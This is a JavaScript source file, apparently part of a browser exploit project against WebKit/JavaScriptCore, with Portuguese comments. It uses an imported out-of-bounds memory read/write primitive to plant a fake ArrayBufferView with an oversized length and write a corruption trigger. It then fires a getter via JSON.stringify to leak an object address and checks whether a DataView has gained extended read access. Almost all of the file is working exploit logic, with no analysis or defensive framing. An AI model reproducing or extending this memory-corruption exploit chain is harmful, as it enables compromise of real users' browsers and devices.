// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';

// ============================================================
// DEFINIÇÕES DE CONSTANTES E VARIÁVEIS GLOBAIS
// ============================================================
const FNAME_MAIN = "ExploitLogic_v20_Combined_Fix1"; // Versão com correção

// --- Constantes para a Estrutura Fake da ArrayBufferView em 0x58 ---
const FAKE_VIEW_BASE_OFFSET_IN_OOB = 0x58;
const FAKE_VIEW_STRUCTURE_ID          = 0x0200BEEF; 
const FAKE_VIEW_TYPEINFO_TYPE         = 0x17;       
const FAKE_VIEW_TYPEINFO_FLAGS        = 0x00;
const FAKE_VIEW_CELLINFO_INDEXINGTYPE = 0x0F;
const FAKE_VIEW_CELLINFO_STATE        = 0x01;
const FAKE_VIEW_ASSOCIATED_BUFFER_PTR = AdvancedInt64.Zero; 
const FAKE_VIEW_MVECTOR_VALUE         = AdvancedInt64.Zero; 
const FAKE_VIEW_MLENGTH_VALUE         = 0xFFFFFFFF;     
const FAKE_VIEW_MMODE_VALUE           = 0x00000000;     

// --- Constantes para a parte "AddrOf" ---
const GETTER_PROPERTY_NAME_ADDROF = "GetterForCombinedTest_v20Fix1";
const PLANT_OFFSET_0x6C_ADDROF    = 0x6C; 
const PLANT_DWORD_FOR_0x6C_ADDROF = 0x190A190A; 
const CORRUPTION_OFFSET_TRIGGER_MAIN = 0x70; 
const CORRUPTION_VALUE_TRIGGER_MAIN  = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF); 

// --- Constantes para Teste de Leitura da SuperView ---
const TEST_READ_SPOOFED_SID_OFFSET = 0x400; 
const TEST_READ_SPOOFED_SID_VALUE  = 0xFEEDFACE; 

let combined_test_results = {};
let target_function_for_addrof_v20; 


// ============================================================
// FUNÇÃO PRINCIPAL (v20_Combined_Fix1)
// ============================================================
export async function sprayAndInvestigateObjectExposure() {
    logS3(`--- Iniciando ${FNAME_MAIN}: Teste Combinado AddrOf e Ativação de SuperView Fake (Fix Limpeza 32B) ---`, "test", FNAME_MAIN);
    
    combined_test_results = {
        getter_called: false,
        candidate_addrof_hex: null,
        superview_read_test_value_hex: null,
        error: null
    };

    target_function_for_addrof_v20 = function() { return "target_func_v20_fix1"; };
    let sprayedFuncs = [];
    for(let i=0; i < 10; i++) sprayedFuncs.push(target_function_for_addrof_v20);

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_dataview_real) {
            throw new Error("OOB Init failed");
        }
        logS3("Ambiente OOB inicializado.", "info", FNAME_MAIN);

        // PASSO 0: Limpar áreas relevantes do oob_array_buffer_real
        logS3("PASSO 0: Limpando áreas de trabalho...", "info", FNAME_MAIN);
        // CORREÇÃO APLICADA AQUI: Limpar 32 bytes em blocos de 8 bytes
        const area_to_clean_start = FAKE_VIEW_BASE_OFFSET_IN_OOB; //0x58
        const area_to_clean_size = 32;
        logS3(`  Limpando ${area_to_clean_size} bytes a partir de ${toHex(area_to_clean_start)}...`, "info", FNAME_MAIN);
        for (let i = 0; i < area_to_clean_size / 8; i++) {
            oob_write_absolute(area_to_clean_start + (i * 8), AdvancedInt64.Zero, 8);
        }
        
        oob_write_absolute(PLANT_OFFSET_0x6C_ADDROF, AdvancedInt64.Zero, 8);     
        oob_write_absolute(TEST_READ_SPOOFED_SID_OFFSET, 0x0, 4); 

        // PASSO 1: Plantar a estrutura FALSA de ArrayBufferView em FAKE_VIEW_BASE_OFFSET_IN_OOB (0x58)
        logS3(`PASSO 1: Plantando estrutura fake de ArrayBufferView em ${toHex(FAKE_VIEW_BASE_OFFSET_IN_OOB)}...`, "info", FNAME_MAIN);
        const sidOffset      = FAKE_VIEW_BASE_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.STRUCTURE_ID_OFFSET;
        const typeInfoBaseOffset = FAKE_VIEW_BASE_OFFSET_IN_OOB + JSC_OFFSETS.JSCell.CELL_TYPEINFO_TYPE_FLATTENED_OFFSET; // Offset base para TypeInfo
        const bufferPtrOff   = FAKE_VIEW_BASE_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.ASSOCIATED_ARRAYBUFFER_OFFSET;
        const mVectorOffset  = FAKE_VIEW_BASE_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET;
        const mLengthOffset  = FAKE_VIEW_BASE_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET;
        const mModeOffset    = FAKE_VIEW_BASE_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.M_MODE_OFFSET;

        oob_write_absolute(sidOffset, FAKE_VIEW_STRUCTURE_ID, 4);
        oob_write_absolute(typeInfoBaseOffset + 0, FAKE_VIEW_TYPEINFO_TYPE, 1); // CELL_TYPEINFO_TYPE_FLATTENED_OFFSET
        oob_write_absolute(typeInfoBaseOffset + 1, FAKE_VIEW_TYPEINFO_FLAGS, 1); // CELL_TYPEINFO_FLAGS_FLATTENED_OFFSET is type_offset + 1
        oob_write_absolute(typeInfoBaseOffset + 2, FAKE_VIEW_CELLINFO_INDEXINGTYPE, 1); // CELL_FLAGS_OR_INDEXING_TYPE_FLATTENED_OFFSET is type_offset + 2
        oob_write_absolute(typeInfoBaseOffset + 3, FAKE_VIEW_CELLINFO_STATE, 1); // CELL_STATE_FLATTENED_OFFSET is type_offset + 3
        oob_write_absolute(bufferPtrOff, FAKE_VIEW_ASSOCIATED_BUFFER_PTR, 8);
        oob_write_absolute(mVectorOffset, FAKE_VIEW_MVECTOR_VALUE, 8);
        oob_write_absolute(mLengthOffset, FAKE_VIEW_MLENGTH_VALUE, 4);
        oob_write_absolute(mModeOffset, FAKE_VIEW_MMODE_VALUE, 4);
        logS3(`  Estrutura fake plantada em ${toHex(FAKE_VIEW_BASE_OFFSET_IN_OOB)}. SID Fake: ${toHex(FAKE_VIEW_STRUCTURE_ID)}`, "good", FNAME_MAIN);

        // PASSO 1.5: Plantar SID de teste para leitura pela SuperView
        oob_write_absolute(TEST_READ_SPOOFED_SID_OFFSET, TEST_READ_SPOOFED_SID_VALUE, 4);
        logS3(`PASSO 1.5: Plantado SID de teste ${toHex(TEST_READ_SPOOFED_SID_VALUE)} em ${toHex(TEST_READ_SPOOFED_SID_OFFSET)}`, "info", FNAME_MAIN);

        // PASSO 2: Plantar o marcador para o "AddrOf" em 0x6C
        const value_to_plant_at_0x6C = new AdvancedInt64(PLANT_DWORD_FOR_0x6C_ADDROF, 0x00000000);
        oob_write_absolute(PLANT_OFFSET_0x6C_ADDROF, value_to_plant_at_0x6C, 8);
        logS3(`PASSO 2: Plantado marcador ${value_to_plant_at_0x6C.toString(true)} em oob_buffer[${toHex(PLANT_OFFSET_0x6C_ADDROF)}]`, "info", FNAME_MAIN);

        // PASSO 3: Configurar e acionar o Getter para tentar ler o "AddrOf"
        const getterObjectForCombinedTest = {
            get [GETTER_PROPERTY_NAME_ADDROF]() {
                combined_test_results.getter_called = true;
                logS3(`    >>>> [GETTER ${GETTER_PROPERTY_NAME_ADDROF} ACIONADO!] <<<<`, "vuln", FNAME_MAIN);
                try {
                    const value_read_from_0x68 = oob_read_absolute(0x68, 8);
                    logS3(`    [GETTER] Valor lido de oob_buffer[0x68]: ${value_read_from_0x68.toString(true)}`, "info", FNAME_MAIN);

                    if (value_read_from_0x68.high() === PLANT_DWORD_FOR_0x6C_ADDROF) {
                        combined_test_results.candidate_addrof_hex = value_read_from_0x68.toString(true);
                        logS3(`      POTENCIAL ADDR_OF CANDIDATO (de 0x68, marcador ${toHex(PLANT_DWORD_FOR_0x6C_ADDROF)} na parte alta OK): ${combined_test_results.candidate_addrof_hex}`, "vuln", FNAME_MAIN);
                    } else {
                        logS3(`      Marcador ${toHex(PLANT_DWORD_FOR_0x6C_ADDROF)} não encontrado na parte alta do valor de 0x68. Encontrado: ${value_read_from_0x68.toString(true)}`, "warn", FNAME_MAIN);
                    }
                } catch (e_getter) {
                    combined_test_results.error = `Getter error: ${e_getter.message}`;
                    logS3(`    [GETTER] ERRO: ${e_getter.message}`, "error", FNAME_MAIN);
                }
                return "GetterCombinedTestValue";
            }
        };

        // PASSO 4: Escrita OOB CRÍTICA (Trigger)
        logS3(`PASSO 4: Escrevendo trigger ${CORRUPTION_VALUE_TRIGGER_MAIN.toString(true)} em ${toHex(CORRUPTION_OFFSET_TRIGGER_MAIN)}...`, "warn", FNAME_MAIN);
        oob_write_absolute(CORRUPTION_OFFSET_TRIGGER_MAIN, CORRUPTION_VALUE_TRIGGER_MAIN, 8);
        
        await PAUSE_S3(100); 
        
        logS3(`PASSO 4.5: Chamando JSON.stringify para acionar getter (tentativa de addrof)...`, "info", FNAME_MAIN);
        JSON.stringify(getterObjectForCombinedTest); 
        
        await PAUSE_S3(100); 

        // PASSO 5: Testar se o oob_dataview_real se tornou uma "Super View"
        logS3(`PASSO 5: Testando capacidade de leitura estendida (SuperView?)...`, "test", FNAME_MAIN);
        try {
            logS3(`  Tentando ler SID de teste ${toHex(TEST_READ_SPOOFED_SID_VALUE)} de ${toHex(TEST_READ_SPOOFED_SID_OFFSET)} usando oob_dataview_real...`, "info", FNAME_MAIN);
            const value_read_by_dataview = oob_dataview_real.getUint32(TEST_READ_SPOOFED_SID_OFFSET, true);
            combined_test_results.superview_read_test_value_hex = toHex(value_read_by_dataview);
            logS3(`    Valor lido: ${combined_test_results.superview_read_test_value_hex}`, "leak", FNAME_MAIN);

            if (value_read_by_dataview === TEST_READ_SPOOFED_SID_VALUE) {
                logS3("    !!!! SUCESSO NA LEITURA DE TESTE !!!! O SID plantado foi lido corretamente.", "good", FNAME_MAIN);
            } else {
                logS3("    FALHA NA LEITURA DE TESTE: Valor lido não corresponde ao SID plantado.", "warn", FNAME_MAIN);
            }
        } catch (e_superview_read) {
            combined_test_results.error = (combined_test_results.error || "") + ` SuperViewReadError: ${e_superview_read.message}`;
            logS3(`    ERRO ao tentar leitura de teste com oob_dataview_real: ${e_superview_read.message}`, "error", FNAME_MAIN);
        }

        logS3("Resultados do Teste Combinado:", "info", FNAME_MAIN);
        for (const key in combined_test_results) {
            logS3(`  ${key}: ${combined_test_results[key]}`, "info", FNAME_MAIN);
        }

        if (combined_test_results.candidate_addrof_hex && combined_test_results.candidate_addrof_hex !== "0x00000000_00000000") {
             logS3("SUCESSO POTENCIAL NO ADDR_OF: Um candidato a endereço foi obtido!", "vuln", FNAME_MAIN);
             document.title = `ADDROF? ${combined_test_results.candidate_addrof_hex}`;
        }

    } catch (e) {
        combined_test_results.error = (combined_test_results.error || "") + ` General error: ${e.message}`;
        logS3(`ERRO CRÍTICO GERAL: ${e.message}`, "critical", FNAME_MAIN);
        if (e.stack) logS3(`Stack: ${e.stack}`, "critical", FNAME_MAIN);
        document.title = `${FNAME_MAIN} FALHOU!`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_MAIN} Concluído ---`, "test", FNAME_MAIN);
        if (document.title.includes(FNAME_MAIN)) { 
             document.title = `${FNAME_MAIN} Done`;
        }
    }
    return combined_test_results;
}
